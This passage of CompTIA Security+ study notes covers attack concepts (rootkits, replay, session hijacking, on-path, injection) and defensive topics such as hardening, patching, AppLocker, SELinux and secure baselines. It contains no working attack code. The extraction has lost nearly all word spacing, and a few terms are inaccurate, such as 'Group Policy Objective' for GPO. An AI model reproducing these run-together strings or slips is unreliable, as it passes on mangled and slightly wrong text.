+permissions■ HorizontalPrivilegeEscalation● Accessingormodifyingresourcesatthesamelevelastheattacker● Occurswhenauserattemptstoaccessresourcesforwhichtheydon't
+
+havepermissionsatthesamelevel■ UnderstandingPrivileges● Applicationandprocessprivilegesarerequiredforexecutingfunctions,
+
+reading,andwritingdata● Applicationsinheritthepermissionsoftheuserrunningthem(e.g.,
+
+system,admin,oruser)● Understandingandmanagingprivilegesiscrucialforsystemsecurity● Attackersaimtogainhigherprivilegestoperformmaliciousactions○ Rootkits■ Classofmalwarethatconcealsitspresencebymodifyingsystemfiles,oftenat
+
+thekernellevel■ Canbechallengingtodetectandprovidesattackerswithpersistence■ RingLevels● RingZero○ Thekernel(center)withthehighestprivileges○ Kernelmoderootkits(RingZero)aremoredangerousduetotheir
+
+extensivecontrol● Rings1to3○ User-levelcomponentswithdecreasingprivilegesasthering
+
+numberincreases
+
+274https://www.DionTraining.com
+
+## Page 275
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ KernelModeRootkit● Embeddedinthekernel(RingZero)● Hasmaximumcontrolandprivileges● Highlydangerousduetotheextensivesystemaccess■ UserModeRootkit● Attachedtouser-levelcomponents(Rings1to3)● Hasadministrator-levelprivileges● Utilizesoperatingsystemfeaturesforpersistence,e.g.,registryortask
+
+scheduler
+
+● ReplayAttacks○ ReplayAttacks■ Typeofnetwork-basedattackwherevaliddatatransmissionsaremaliciouslyor
+
+fraudulentlyre-broadcast,repeated,ordelayed■ Involvesinterceptingdata,analyzingit,anddecidingwhethertoretransmitit
+
+later■ DifferentfromaSessionHijack● InaSessionHijack,theattackeraltersreal-timedatatransmission● InaReplayAttack,theattackerinterceptsthedataandthencandecide
+
+laterwhethertoretransmitthedata○ ApplicationsofReplayAttacks■ Notlimitedtobanking;canoccurinvariousnetworktransmissions● Email● Onlineshopping● Socialmedia■ Commoninwirelessauthenticationattacks,especiallywitholderencryption
+
+275https://www.DionTraining.com
+
+## Page 276
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+protocolslikeWEP(WiredEquivalentPrivacy)○ CredentialReplayAttack■ SpecifictypeofreplayattackthatInvolvescapturingauser'slogincredentials
+
+duringasessionandreusingthemforunauthorizedaccess○ PreventingReplayAttacks■ Usesessiontokenstouniquelyidentifyauthenticationsessions■ Sessiontokensaregeneratedforeachsession,makingitchallengingforattackers
+
+toreplaysessions■ Implementmulti-factorauthenticationtorequireadditionalauthentication
+
+factors,makingreplaymoredifficult■ Byusingmulti-factorauthentication,attackerslackthenecessaryadditional
+
+informationtoreplayloginsessions■ ImplementsecurityprotocolslikeWPA3(Wi-FiProtectedAccess3)tomitigate
+
+replayattackthreats
+
+● SessionHijacking○ SessionManagement■ Fundamentalsecuritycomponentinwebapplications■ Enableswebapplicationstouniquelyidentifyauseracrossanumberofdifferent
+
+actionsandrequests,whilekeepingthestateofthedatageneratedbytheuser
+
+andensuringitisassignedtothatuser○ Cookie■ Textfileusedtostoreinformationaboutauserwhentheyvisitawebsite■ Cookiesmustbeprotectedbecausetheycontainclientinformationthatisbeing
+
+transmittedacrosstheInternet
+
+276https://www.DionTraining.com
+
+## Page 277
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Sessioncookies● Non-persistent,resideinmemory,andaredeletedwhenthebrowser
+
+instanceisclosed■ PersistentCookies● Cookiesthatarestoredinthebrowsercacheuntiltheyaredeletedbythe
+
+userorpassadefinedexpirationdate● Cookiesshouldbeencryptediftheystoreconfidentialinformation○ SessionHijacking■ Atypeofspoofingattackwheretheattackerdisconnectsahostthenreplacesit
+
+withhisorherownmachine,spoofingtheoriginalhost'sIPaddress■ Sessionhijackingattackscanoccurthroughthetheftormodificationofcookies○ SessionPredictionAttacks■ Atypeofspoofingattackwheretheattackerattemptstopredictthesession
+
+tokentohijackasession■ Asessiontokenmustbegeneratedusinganon-predictablealgorithmanditmust
+
+notrevealanyinformationaboutthesessionclient○ CookiePoisoning■ Modifiesthecontentsofacookieafterithasbeengeneratedandsentbythe
+
+webservicetotheclient'sbrowsersothatthenewlymodifiedcookiecanbe
+
+usedtoexploitvulnerabilitiesinthewebapp● On-pathAttacks○ On-PathAttack■ Anattackwheretheattackerpositionstheirworkstationlogicallybetweentwo
+
+hostsduringcommunication■ Theattackertransparentlycaptures,monitors,andrelayscommunications
+
+betweenthosehosts
+
+277https://www.DionTraining.com
+
+## Page 278
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ MethodsforOn-PathAttacks■ ARPPoisoning● ManipulatingAddressResolutionProtocol(ARP)tablestoredirect
+
+networktraffic■ DNSPoisoning● AlteringDNSresponsestoreroutetraffic■ RogueWirelessAccessPoint● Creatingafakewirelessaccesspointtointercepttraffic■ RogueHuborSwitch● Introducingamalicioushuborswitchtocapturedataonawirednetwork○ ReplayAttack■ Occurswhenanattackercapturesvaliddataandthenreplaysitimmediatelyor
+
+withadelay■ Commoninwirelessnetworkattacks;canalsobeusedinwirednetworks○ RelayAttack■ Theattackerbecomespartoftheconversationbetweentwohosts■ Servesasaproxyandcanreadormodifycommunicationsbetweenthehosts■ Anytrafficbetweentheclientandservergoesthroughtheattacker○ ChallengeswithReplayandRelay■ Encryptioncanmakeinterceptionandcraftingcommunicationdifficult■ StrongencryptionschemeslikeTLS1.3canposesignificantchallengesfor
+
+attackers
+
+■ TechniqueslikeSSLstrippingmaybeusedtodowngradeencryptiontoan
+
+278https://www.DionTraining.com
+
+## Page 279
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+unsecuredconnection● SSLStripping○ Anattackthattrickstheencryptionapplicationintopresentingan
+
+HTTPconnectioninsteadofHTTPS○ Enablesattackerstocaptureunencrypteddatawhentheuser
+
+believestheyareusingasecureconnection○ DowngradeAttack■ Anattackerforcesaclientorservertoabandonahighersecuritymodeinfavor
+
+- falowersecuritymode■ ScopeofDowngradeAttacks● Downgradeattackscanbeusedwithvariousencryptionandprotection
+methods,includingWi-FiandVPNs● Anysituationwhereaclientagreestoalowerlevelofsecuritythatisstill
+
+backwardcompatiblecanbevulnerabletoadowngradeattack
+
+● InjectionAttacks○ LightweightDirectoryAccessProtocol(LDAP)■ Anopen,vendor-neutral,industrystandardapplicationprotocolforaccessing
+
+andmaintainingdistributeddirectoryinformationservicesoveranInternet
+
+Protocolnetwork○ LDAPInjection■ Anapplicationattackthattargetsweb-basedapplicationsbyfabricatingLDAP
+
+statementsthataretypicallycreatedbyuserinput■ UseinputvalidationandinputsanitizationasprotectionagainstanLDAP
+
+injectionattack○ CommandInjection
+
+279https://www.DionTraining.com
+
+## Page 280
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Occurswhenathreatactorisabletoexecutearbitraryshellcommandsonahost
+
+viaavulnerablewebapplication○ ProcessInjection■ Methodofexecutingarbitrarycodeintheaddressspaceofaseparatelive
+
+process■ Therearemanydifferentwaystoinjectcodeintoaprocess● InjectionthroughDLLs● ThreadExecutionHijacking● ProcessHollowing● ProcessDoppelGanging● AsynchronousProcedureCalls● PortableExecutableInjections■ Mitigationincludes● Endpointsecuritysolutionsthatareconfiguredtoblockcommon
+
+sequencesofattackbehavior● SecurityKernelModules● PracticeofLeastPrivilege
+
+● IndicatorsofCompromise(IoC)○ IndicatorsofCompromise(IoC)■ Piecesofforensicdatathatidentifypotentiallymaliciousactivityonanetworkor
+
+system■ Servesasdigitalevidencethatasecuritybreachhasoccurred
+
+○ IoCincludesthefollowing
+
+280https://www.DionTraining.com
+
+## Page 281
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ AccountLockouts■ Occurswhenanaccountislockedduetomultiplefailedloginattempts■ Indicatesapotentialbruteforceattacktogainaccess■ Balancingsecuritywithusabilityiscrucialwhenimplementingaccount
+
+lockout○ ConcurrentSessionUsage■ Referstomultipleactivesessionsfromasingleuseraccount■ Indicatesapossibleaccountcompromisewhenthelegitimateuserisalso
+
+loggedin○ BlockedContent■ Involvesattemptstoaccessordownloadcontentblockedbysecurity
+
+protocols■ Suggestsausertryingtoaccessmaliciouscontentoranattacker
+
+attemptingtostealdata○ ImpossibleTravel■ Detectsloginsfromgeographicallydistantlocationswithinan
+
+unreasonablyshorttimeframe■ Indicatesalikelyaccountcompromiseasphysicaltravelbetweenthese
+
+locationsisimpossible○ ResourceConsumption■ Unusualspikesinresourceutilization● CPU● Memory● Networkbandwidth■ MayindicatemalwareinfectionsorDistributedDenialofService(DDoS)
+
+attacks
+
+281https://www.DionTraining.com
+
+## Page 282
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ ResourceInaccessibility■ Inabilitytoaccessresourceslikefiles,databases,ornetworkservices■ Suggestsaransomwareattack,wherefilesareencrypted,andaransomis
+
+demanded○ Out-of-CycleLogging■ Logentriesoccurringatunusualtimes■ Indicatesanattackertryingtohidetheiractivitiesduringoff-peakhours○ MissingLogs■ Signthatlogshavebeendeletedtohideattackeractivities■ Mayresultingapsinthelogdata,makingithardertotracetheattacker's
+
+actions○ PublishedArticlesorDocuments■ Attackerspubliclydisclosetheiractions,boastingabouttheirskillsor
+
+causingreputationaldamage■ Canoccuronsocialmedia,hackerforums,newspaperarticles,orthe
+
+victim'sownwebsite
+
+282https://www.DionTraining.com
+
+## Page 283
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+Hardening
+
+Objectives:● 2.5-Explainthepurposeofmitigationtechniquesusedtosecuretheenterprise● 4.1-Givenascenario,youmustbeabletoapplycommonsecuritytechniquestocomputing
+
+resources● 4.5-Givenascenario,youmustbeabletomodifyenterprisecapabilitiestoenhancesecurity
+
+● Hardening○ Hardening■ Processofenhancingsystem,application,ornetworksecurity■ Measures● Applysecuritypatches,configureaccesscontrols,disableunnecessary
+
+services■ Purpose● Strengthenoverallsecuritypostureandresilienceagainstcyberattacks○ StudyTopics■ DefaultConfigurations● Definitionandidentificationofdefaultconfigurations● Changingdefaultpasswords,openports,andinsecureconfigurations■ RestrictingApplications● Applicationrestrictionapproach● Allowlisting,blockingunauthorizedsoftware■ DisablingUnnecessaryServices● Identifyingunnecessaryservices
+
+283https://www.DionTraining.com
+
+## Page 284
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Risksandconsequencesofrunningunnecessaryservices● Disablingunnecessaryservicestoreducetheattacksurface■ TrustedOperatingSystems● Definitionandcharacteristicsoftrustedoperatingsystems● Rigoroussecurityevaluationsandcertifications■ UpdatesandPatches● Understandingupdatesvs.patches● Importanceofregularsoftwareupdates● Systematicprocessofpatchmanagement■ GroupPolicies● RoleofGroupPoliciesinWindowsenvironments● Centralmanagementandcontrolofuserandcomputersettings■ SELinux(Security-EnhancedLinux)● RoleandimplementationofSELinux● Mandatoryaccesscontrolsforenhancedsecurity■ DataEncryptionLevels● Differentlevelsofdataencryption○ Full-disk○ Partition○ File○ Volume○ Database○ RecordLevelEncryption■ SecureBaselines● Definitionandpurposeofsecurebaselines● Establishingasecurestartingpointforminimizingsecurityrisks
+
+284https://www.DionTraining.com
+
+## Page 285
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● ChangingDefaultConfigurations○ Defaultpasswords■ Presetauthenticationdetails■ Shouldbeimmediatelychanged■ Rotateevery90days■ Relyonpasswordmanager○ Unneededportsandprotocols■ Closeanyportsthataren’tneeded■ Auditportsandprotocolsthatareenabled■ Lookforsecureversionsofprotocolsandusetheminstead○ Extraopenports■ Maybeopenbydefault■ Usethemoresecureportsandclosetheinsecureones
+
+● RestrictingApplications○ LeastFunctionality■ Involvesconfiguringsystemswithonlyessentialapplicationsandservices■ Leastfunctionalityaimstoprovideonlythenecessaryapplicationsandservices■ Unneededapplicationsshouldberestrictedoruninstalledtoreduce
+
+vulnerabilities■ Overtime,personalcomputersaccumulateunnecessaryprograms○ ManagingSoftware■ Keepingsoftwareup-to-dateiscrucialforsecurity■ Newprogramsmaybeinstalledwithoutremovingoldversions■ Largenetworksrequirepreventivemeasurestocontrolexcessiveinstallations
+
+285https://www.DionTraining.com
+
+## Page 286
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ CreatingSecureBaselineImages■ Securebaselineimagesareusedtoinstallnewcomputers■ ImagesincludetheOS,minimumrequiredapplications,andstrictconfigurations■ Theseimagesshouldbeupdatedbasedonevolvingbusinessneeds○ PreventingUnauthorizedSoftware■ Unauthorizedsoftwareinstallationposessecurityrisks■ Applicationallowlistingandblocklistingareusedtocontrolwhichapplications
+
+canrunonaworkstation○ ApplicationAllowlisting■ Onlyapplicationsontheapprovedlistareallowedtorun■ Allotherapplicationsareblockedfromrunning■ Similartoan"ExplicitAllow"statementinaccesscontrol○ ApplicationBlocklisting■ Applicationsplacedontheblocklistarepreventedfromrunning■ Allotherapplicationsarepermittedtorun■ Anyapplicationontheblocklistisdenied○ ChoosingBetweenAllowlistingandBlocklisting■ Allowlistingismoresecure,aseverythingisdeniedbydefault■ Managingallowlistscanbechallengingasupdatesrequirelistadjustments■ Blocklistingislesssecure,aseverythingisallowedexceptwhat'sexplicitlydenied■ Managingblocklistscanbedifficult,aseverynewprogramvariationwouldbe
+
+alloweduntilaruleiscreated○ CentralizedManagement■ MicrosoftActiveDirectorydomaincontrollersallowcentralizedmanagementof
+
+lists■ Grouppoliciescanbeusedtodeployandmanageallowlistsandblocklistsacross
+
+286https://www.DionTraining.com
+
+## Page 287
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+workstationsinanetwork
+
+● TrustedOperatingSystems○ TrustedOperatingSystem(TOS)■ Anoperatingsystemthatisdesignedtoprovideasecurecomputingenvironment
+
+byenforcingstringentsecuritypoliciesthatusuallyrelyonmandatoryaccess
+
+controls■ UsedwhereConfidentiality,Integrity,andAvailabilityisessential○ EvaluationAssuranceLevel(EAL)■ ApredefinedsecuritystandardandcertificationfromtheCommonCriteriafor
+
+InformationTechnologySecurityEvaluation■ Commoncriteriastandardsareusedtoassesstheeffectivenessofthesecurity
+
+controlsinanoperatingsystem● EAL1isthelowestlevelofassurance● EAL7isthehighestlevelofassurance○ Trustedoperatingsystemsofteninclude■ MandatoryAccessControl● Accesspermissionsaredeterminedbyapolicydefinedbythesystem
+
+administratorsandenforcedbytheoperatingsystem■ SecurityAuditing■ Role-basedAccessControl○ Examples■ SELinux(Security-EnhancedLinux)● SetofcontrolsthatareinstalledontopofanotherLinuxdistributionlike
+
+CentOSorRedHatLinux
+
+287https://www.DionTraining.com
+
+## Page 288
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ TrustedSolaris● Offerssecure,multi-leveloperationswithMAC,detailedsystemaudits,
+
+anddata/processcompartmentalization○ TrustedOSenhancessecuritywithmicrokernelsbyminimizingthetrustedbaseand
+
+reducingattacksurfaceandvulnerabilities○ Choosinganoperatingsystemrequiresbalancingsecuritywithusability,performance,
+
+andfunctionalrequirements
+
+● UpdatesandPatches○ Patchmanagementcanbe■ Manual● Rareforfullymanualpatchmanagementthesedays■ Automated● Morereliableandmostoftenused○ Hackerscanreverseengineerpatchestofindtheunderlyingvulnerability○ Hotfix■ Asoftwarepatchthatsolvesasecurityissueandshouldbeappliedimmediately
+
+afterbeingtestedinalabenvironment○ Update■ Providesasystemwithadditionalfunctionality,butitdoesn’tusuallyprovideany
+
+patchingofsecurityrelatedissues■ Oftenintroducenewvulnerabilities○ ServicePack■ Includesallthehotfixesandupdatessincethereleaseoftheoperatingsystem○ EffectivePatchManagementinvolves■ Assigningadedicatedteamtotrackvendorsecuritypatches
+
+288https://www.DionTraining.com
+
+## Page 289
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Establishingautomatedsystem-widepatchingforOSandapplications■ Includingcloudresourcesinpatchmanagement■ Categorizingpatchesasurgent,important,ornon-criticalforprioritization■ Createatestenvironmenttoverifycriticalpatchesbeforeproduction
+
+deployment■ Maintainingcomprehensivepatchinglogsforprogramevaluationandmonitoring■ Establishingaprocessforevaluating,testing,anddeployingfirmwareupdates■ Developingatechnicalprocessfordeployingapprovedurgentpatchesto
+
+production■ Periodicallyassessingnon-criticalpatchesforcombinedrollout
+
+● PatchManagement○ PatchManagement■ Planning,testing,implementing,andauditingofsoftwarepatches○ Importantforcompliance○ FourStepProcess■ Planning● Creatingpolicies,procedures,andsystemstotrackandverifypatch
+
+compatibility● Agoodpatchmanagementtoolconfirmspatchdeployment,installation,
+
+andfunctionalverificationonserversorclients■ Testing● Dothistopreventthepatchfromcausingadditionalproblems■ Implementing● Deploytoalldevicesthatneedit● Canbedonemanuallyorautomated
+
+289https://www.DionTraining.com
+
+## Page 290
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Largeorganizationsshoulduseacentralupdateserverinsteadof
+
+WindowsUpdateorothertool● MobiledevicescanbepatchedusinganMDM● PatchRings○ Implementpatchesonegroup(orring)atatime■ Auditing● Scannetworktoensurethepatchwasinstalledcorrectly● Determineifthereareanyunexpectedproblemsasaresultofthepatch○ Firmwareversionsshouldalsobemonitoredandpatched■ Companieswillhavecentralizedresourcestohelpkeepfirmwarepatched
+
+● GroupPolicies○ GroupPolicy■ Asetofrulesandpoliciesthatcanbeappliedtousersorcomputeraccounts
+
+withinanoperatingsystem○ AccessingGroupPolicyEditor■ AccesstheGroupPolicyEditorbyentering"gpedit"intherunprompt■ ThelocalGroupPolicyEditorisusedtocreateandmanagepolicieswithina
+
+Windowsenvironment○ GroupPoliciesOverview■ Eachpolicyactsasasecuritytemplateapplyingrulessuchas● Passwordcomplexityrequirements,● Accountlockoutpolicies● Softwarerestrictions● Applicationrestrictions■ InaWindowsenvironmentwithanActiveDirectorydomaincontroller,youhave
+
+290https://www.DionTraining.com
+
+## Page 291
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+accesstoanadvancedGroupPolicyEditor○ SecurityTemplates■ Agroupofpoliciesthatcanbeloadedthroughoneprocedure■ Incorporateenvironments,createsecuritytemplateswithpredefinedrules
+
+basedonadministrativepolicies■ SecurityTemplate● AgroupofpoliciesthatcanbeloadedthroughtheGroupPolicyEditor■ GroupPolicyObjective(GPO)● Usedtohardentheoperatingsystemandestablishsecurebaselines○ Baselining■ Aprocessofmeasuringchangesinthenetwork,hardware,orsoftware
+
+environment■ Helpsestablishwhat"normal"isfortheorganization■ Identifiesabnormalordeviationsforinvestigation○ GroupPolicyEditorinWindows■ AccesstheGroupPolicyEditorbyentering"gpedit"intherunprompt■ Createalloworblocklistrulesforapplicationcontrolpolicies
+
+○ CreatingaRuleinGroupPolicyEditor■ LaunchtheGroupPolicyEditor■ Navigateto"ComputerConfiguration">"WindowsSettings">"SecuritySettings"
+
+>"ApplicationControlPolicies">"AppLocker”■ Createanexecutablerule■ Choosetoallowordeny■ Selectwhotheruleappliesto(e.g.,everyone)■ Definetherulebasedonconditionslikepublisher,path,orfilehash.
+
+291https://www.DionTraining.com
+
+## Page 292
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Specifythepathtobeblocked(e.g.,thetempdirectory)■ Nametheruleandprovideadescription■ Decidewhethertocreatedefaultrules(allowordeny)andsavethepolicy■ Deploythepolicyacrosstheenvironmentforsystemhardening○ RulesinGroupPolicyEditor■ AllowRules(Default)● Allowfilesinthe"ProgramFiles"directorytolaunch● Allowfilesinthe"Windows"foldertolaunch● Allowadministratorstolaunchanyfile■ DenyRule(Custom)● Blockallfilesfromrunninginthe"tempdirectory"○ Byfollowingthesesteps,youcanestablishasecurebaselineforyourWindowssystems,
+
+improvingoverallsecurityandpolicymanagement
+
+● SELinux○ SELinuxandMACBasics■ SELinux(SecurityEnhancedLinux)● Asecuritymechanismthatprovidesanadditionallayerofsecurityfor
+
+Linuxdistributions● EnforcesMandatoryAccessControl(MAC)■ MandatoryAccessControl(MAC)● Restrictsaccesstosystemresourcesbasedonsubjectclearanceand
+
+- bjectlabels■ Context-basedpermissions● Permissionschemesthatconsidervariouspropertiestodetermine
+whethertograntordenyaccesstoauser
+
+292https://www.DionTraining.com
+
+## Page 293
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Twomaincontext-basedpermissionschemesinLinuxthatuseMAC● SELinux● AppArmor■ DACvs.MAC● DAC(DiscretionaryAccessControl)○ Eachobjecthasalistofentitiesthatareallowedtoaccessit○ Allowsobjectownerstodirectlycontrolaccessusingtoolslike
+
+'chown'and'chmod'● SELinuxreliesonMACforpermissionsandaccesscontrol,notDAC○ SELinux■ Thedefaultcontext-basedpermissionschemeinCentOSandRedHatEnterprise
+
+LinuxcreatedbyNSA■ UsedtoenforceMAConprocessesandresources■ Enablesinformationtobeclassifiedandprotected■ Enhancesfilesystemandnetworksecurity,preventingunauthorizedaccess,
+
+securitybreaches,andexecutionofuntrustworthyprograms○ ThreeMainContextsinSELinux■ UserContext● Defineswhichuserscanaccessanobject,includingcommoncontextslike
+
+'unconfined_u,''user_u,''sysadm_u,'and'root'■ RoleContext● Determineswhichrolescanaccessanobject,using'object_r'forfilesand
+
+directories■ TypeContext● Essentialforfine-grainedaccesscontrol,groupingobjectswithsimilar
+
+securitycharacteristics
+
+293https://www.DionTraining.com
+
+## Page 294
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ OptionalContext■ LevelContext● Describesthesensitivitylevelofafile,directory,orprocess● Knownasamulti-levelsecuritycontext,allowingfurtheraccesscontrol
+
+refinement○ SELinuxModes■ DisabledMode● TurnsoffSELinux,relyingondefaultDACforaccesscontrol■ EnforcingMode● EnforcesallSELinuxsecuritypolicies,preventingpolicyviolations■ PermissiveMode● EnablesSELinuxbutdoesn'tenforcepolicies,allowingprocessesto
+
+bypasssecuritypolicies
+
+○ SELinuxPolicies■ SELinuxPolicy● Describesaccesspermissionsforusers,programs,processes,files,and
+
+devices■ TwoMainPolicyTypes● TargetedPolicies○ Onlyspecificprocessesareconfinedtoadomain,whileothersrun
+
+unconfined● StrictPolicies○ EverysubjectandobjectoperatesunderMAC,butit'smore
+
+complextosetup
+
+294https://www.DionTraining.com
+
+## Page 295
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ ViolationMessages■ SELinuxcapturesviolationmessagesinanauditlog■ Violationscanoccurwhensomeonetriestoaccessanunauthorizedobject,oran
+
+actioncontradictsanexistingpolicy○ PolicyConfiguration■ InitialSELinuxsetupmayresultinfalseviolations,requiringpolicytweakingand
+
+fine-tuning■ Strongsecuritydependsoncreatingeffectiverestrictedprofilesandhardening
+
+applicationstopreventmaliciousattacks
+
+● DataEncryptionLevels○ DataEncryption■ Processofconvertingdataintoasecretcodetopreventunauthorizedaccess○ Levels■ Full-disk● Encryptstheentireharddrivetoprotectallofthedatabeingstoredonit■ Partition● Similartofull-diskencryptionbutitisonlyappliedtoaspecificpartition
+
+- nthestoragedevice● VeraCrypt○ Toolthatselectivelyencryptspartitions,likesensitivedocuments,
+whileleavingtheOSpartitionunencrypted■ Volume● Usedtoencryptasetspaceonthestoragemedium● Createsanencryptedcontainerthatcanhousevariousfilesandfolders
+
+295https://www.DionTraining.com
+
+## Page 296
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ File-levelEncryption● Usedtoencryptanindividualfileinsteadofanentirepartitionoran
+
+entirediskdrive● GNUPrivacyGuard○ Atoolthatprovidescryptographicprivacyandauthenticationfor
+
+datacommunication■ Database● Securestheentiredatabase● Canextendtheencryptionacrossmultiplestoragedevicesorcloud
+
+storage● Similartofull-diskencryption■ Record● Encryptsindividualrecordsorrowswithinadatabase
+
+● SecureBaselines○ SecureBaseline■ Standardsetofsecurityconfigurationsandcontrolsappliedtosystems,
+
+networks,orapplicationstoensureaminimumlevelofsecurity■ Helpsorganizationsmaintainconsistentsecurityposturesandmitigatecommon
+
+vulnerabilities○ EstablishingaSecureBaseline■ Theprocessbeginswithathoroughassessmentofthesystem,network,or
+
+applicationthatrequiresprotection■ Identifythetypeofdatainvolved,understanddataworkflows,andevaluate
+
+potentialvulnerabilitiesandthreats■ Bestpractices,industrystandards,andcompliancerequirements(e.g.,ISO
+
+296https://www.DionTraining.com
+
+## Page 297
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+27001,NISTSP800-53)areusedasstartingpointsfordefiningthesecure
+
+baseline■ Createasecurebaselineconfigurationbysecuringtheoperatingsystemona
+
+referencedevice(e.g.,alaptop)○ ConfiguringaSecureBaseline■ Install,update,configure,andsecuretheoperatingsystemonthereference
+
+device■ Checkthedeviceagainstbaselineconfigurationguidesandscanforknown
+
+vulnerabilitiesormisconfigurations■ Installrequiredapplications(e.g.,MicrosoftOfficesuite,endpointdetectionand
+
+responseagents)■ Scanforvulnerabilitiesintheinstalledapplicationsandremediatethem■ Createanimageofthereferencedeviceasthe"knowngoodandsecure
+
+baseline”○ Deployment■ Configurefirewalls,setupuserpermissions,implementencryptionprotocols,
+
+andensureantivirusandanti-malwaresolutionsareproperlyinstalledand
+
+updated■ Useautomatedtoolsandscriptstoensureconsistentapplicationofthesecure
+
+baselineacrossdevices■ InaWindowsenvironment,GroupPolicyObjects(GPO)canbeusedtodictate
+
+policies,userrights,andauditsettings■ Incloudenvironments(e.g.,AWS),serviceslikeAWSConfigareemployedto
+
+defineanddeploysecureconfigurations○ Maintenance■ Lockdownsystemstopreventunauthorizedsoftwareinstallationor
+
+297https://www.DionTraining.com
+
+## Page 298
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+configurationchanges■ Regularaudits,monitoring,andcontinuousassessmentarerequiredtokeepthe
+
+baselineup-to-date■ Continuousmonitoringtoolshelpidentifydeviationsfromthebaselineand
+
+triggeralertsforimmediateremediation■ Periodicallyreviewandupdatethesecurebaselinetoadapttochangesin
+
+- rganizationalinfrastructure,businessneeds,andemergingthreats○ EmployeeTrainingandAwareness■ Conducttrainingsessionstoeducateemployeesabouttheimportanceof
+adheringtosecurebaselineconfigurations■ Raiseawarenessaboutthepotentialrisksofdeviatingfromthebaseline■ Encourageemployeestoreportanysuspiciousactivitiestheynoticewhenusing
+
+theirsystems
+
+298https://www.DionTraining.com
+
+## Page 299
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+SecurityTechniques
+
+Objectives:● 4.1-Givenascenario,youmustbeabletoapplycommonsecuritytechniquestocomputing
+
+resources● 4.5-Givenascenario,youmustbeabletomodifyenterprisecapabilitiestoenhancesecurity
+
+● SecurityTechniques○ SecurityTechniques■ Protectingdigitalassetsfromevolvingcyberthreats■ Scope● Traditionaltoadvancedsecuritytechniques○ StudyTopics■ WirelessInfrastructureSecurity● Significanceofwirelessnetworks● Challengesandsecurityconsiderations■ WirelessSecuritySettings● WPA3,AAA/RADIUS,Cryptographicprotocols● Authenticationprotocolsinwirelesssecurity■ ApplicationSecurity● Inputvalidation,securecookies● Staticanddynamiccodeanalysis● Codesigningandsandboxing■ NetworkAccessControl(NAC)● PurposeandfunctionalityofNAC
+
+299https://www.DionTraining.com
+
+## Page 300
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Policyenforcementondevicesandusers■ WebandDNSFiltering● Agent-basedwebfilters,centralizedproxy● URLscanning,contentcategorization,blockrules● Reputation-basedfiltering■ EmailSecurity● DMARC,DKIM,SPFprotocols● Gatewayprotocolandspamfilteringtechniques■ EndpointDetectionandResponse(EDR)● Continuousmonitoringofendpointdevices● Identifying,investigating,andpreventingcyberthreats■ UserBehaviorAnalytics(UBA)● Leveragingmachinelearninganddataanalytics● Identifyingpotentiallyharmfulactivities● Detectionofanomaliesordeviations■ SelectingSecureProtocols● Protocolselection,portselection● Transportmethodselection
+
+● WirelessInfrastructureSecurity○ WirelessInfrastructureSecurity■ Crucialforsecuringwirelessnetworksinorganizations■ PlacementofWirelessAccessPoints(WAPs)impactsnetworkperformanceand
+
+security○ WirelessAccessPointPlacement■ WAPsallowwirelessdevicestoconnecttoawirednetworkusingWi-Fistandards
+
+300https://www.DionTraining.com
+
+## Page 301
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Placementinfluences● Networkrange● Coverage● Security■ Properplacementpreventsunauthorizedaccessbylimitingsignalleakageor
+
+deadzones■ Isahugeconcernintermsofthesecurityofthewirelessnetwork○ PlacementConsiderations■ AvoidplacingWAPsnearexternalwallsorwindowstopreventsignalleakage■ PlaceWAPsincentrallocationsforoptimalcoverage■ UseunidirectionalantennaswhenWAPsarenearexternalwalls■ MountWAPsonhigherlocations,suchasceilings,forbettercoverage○ ExtendedServiceSet(ESS)■ MultipleWAPsworktogethertoprovideseamlessnetworkcoverage■ ImportantforlargebuildingswhereasingleWAPisinsufficient○ WirelessAccessPointInterference■ InterferenceoccurswhenmultipleWAPsusethesamechannelsoroverlapping
+
+frequencies■ Types● Co-ChannelInterference● AdjacentChannelInterference■ Inthe2.4GHzband,selectChannels1,6,and11toavoidoverlap○ ToolsforensuringgoodWirelessAccessPointCoverage■ SiteSurveys● Essentialforplanninganddesigningwirelessnetworks● Involvesasitevisittotestforradiofrequencyinterferenceandidentify
+
+301https://www.DionTraining.com
+
+## Page 302
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+- ptimalWAPinstallationlocations■ HeatMaps● Graphicalrepresentationsof○ Wirelesscoverage○ Signalstrength○ Frequencyutilization● Usefulfortroubleshooting○ Coverageissues○ Deadzones○ Signalleakage● AidinvisualizingtheeffectivenessofWAPplacementandconfiguration
